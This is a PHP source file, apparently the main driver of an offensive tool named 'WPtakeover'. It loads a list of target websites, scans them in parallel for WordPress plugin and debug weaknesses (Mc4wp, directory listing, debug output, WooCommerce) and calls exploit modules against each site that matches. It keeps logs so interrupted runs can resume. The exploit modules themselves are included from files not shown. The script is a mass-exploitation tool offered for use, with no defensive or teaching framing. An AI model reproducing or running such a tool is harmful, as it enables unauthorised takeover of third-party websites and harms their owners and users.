<?php
/**
 * @Author: Nokia 1337
 * @Date:   2019-04-05 00:43:52
 * @Last Modified by:   Nokia 1337
 * @Last Modified time: 2019-06-26 23:08:34
*/
error_reporting(E_ALL);
require_once("modules/sdata/sdata-modules.php");
require_once("modules/color-php/color.php");
require_once("modules/wptakeover.php");

require_once("exploit/Mc4wp.php");
require_once("exploit/dirlisting.php");
require_once("exploit/debug.php");
require_once("exploit/WooCommerce.php");

echo " _ _ _ _____ _       _                         \r\n";
echo "| | | |  _  | |_ ___| |_ ___ ___ _ _ ___ ___   \r\n";
echo "| | | |   __|  _| .'| '_| -_| . | | | -_|  _|  \r\n";
echo "|_____|__|  |_| |__,|_,_|___|___|\_/|___|_|    \r\n\n";
                                          


$config = array(
	'threads' => 20, 
);

$Wptakeover 		= new Wptakeover;
$Sdata 				= new Modules(); 


$Exploit_Mc4wp 			= new Exploit_Mc4wp;
$Exploit_Dirlisting 	= new Exploit_Dirlisting;
$Exploit_Debug 			= new Exploit_Debug;
$Exploit_WooCommerce 	= new Exploit_WooCommerce;

if(file_exists('target-lock.txt')){
	$target 		= file_get_contents('target-lock.txt');
}else{
	$target 		= $Wptakeover->stuck("[+] Load Target  : ");
	file_put_contents('target-lock.txt', $target);
}

$namelog  		= $target.'-log.txt';
$namekey  		= $target.'-key.txt';

$getTarget  	= file_get_contents($target);
$pars_target 	= explode("\n", $getTarget);
$total_target 	= count($pars_target);
$pars_target  	= array_chunk($pars_target, $config['threads']);
$tmp_total 		= 0;

$checkKey = file_get_contents($namekey);
if(file_exists($namelog) || file_exists($namekey)){
	echo "[+] Resume exploits ... \r\n";
	foreach ($pars_target as $key => $value) {
		if($key <= $checkKey){
			unset($pars_target[$key]);
		}
	}
}

foreach ($pars_target as $keys => $target) {
	file_put_contents($namekey, $keys);
	$listScope = $Wptakeover->scope();
	foreach ($target as $key => $value) {
		$value = explode(",", $value);
		$value = $value[0];

		if(!empty($value)){
			file_put_contents($namelog, $value);
		}

		foreach ($listScope as $scopelink => $scope) {
			$scope['target'] = $value;
			$url[] = array('url' => $value."/".$scopelink,'note' => $scope);
		}
		$tmp_total++;
	}
	echo "[+] Search for vulnerabilities ... ".$tmp_total."/".$total_target."\r\n";
	$result = $Sdata->sdata($url);unset($url);
	foreach ($result as $key => $dataRespons) {
		preg_match_all($dataRespons['data']['note']['regex'], $dataRespons['respons'] , $match);
		if($match[0][0]){
			$listvuln[$dataRespons['data']['note']['target']][] = array(
				'exploit' => $dataRespons['data']['note']['exploit'], 
				'respons' => $dataRespons,
			);
		}else{
			$tempcont = ($tempcont+1);
		}
	}
	echo "[+] Vulnerability ".count($listvuln)." | Not vulnerable : ".$tempcont."\r\n";
	foreach ($listvuln as $link => $reexploit) {
		echo "[+] Check vulnerability : ".$link."\r\n";
		foreach ($reexploit as $key => $value) {
			echo "[+]=> ".$value[respons][data][note][name]." ... ";
			switch ($value['exploit']) {
				case 'Mc4wp':
					$Exploit_Mc4wp->exploit($value['respons']['respons']);
				break;
				case 'Dirlisting':
					$Exploit_Dirlisting->exploit($value['respons']['respons'] , $value[respons][data][url]);
				break;
				case 'Debug':
					$Exploit_Debug->exploit($value['respons']['respons']);
				break;
				case 'WooCommerce':
					$Exploit_WooCommerce->exploit($value['respons'][data][url]);
				break;
				default:
					# code...
				break;
			}
			echo "done!\r\n";
		}
	}
	unset($listvuln);
	echo "|\r\n";
	echo "|\r\n";
}
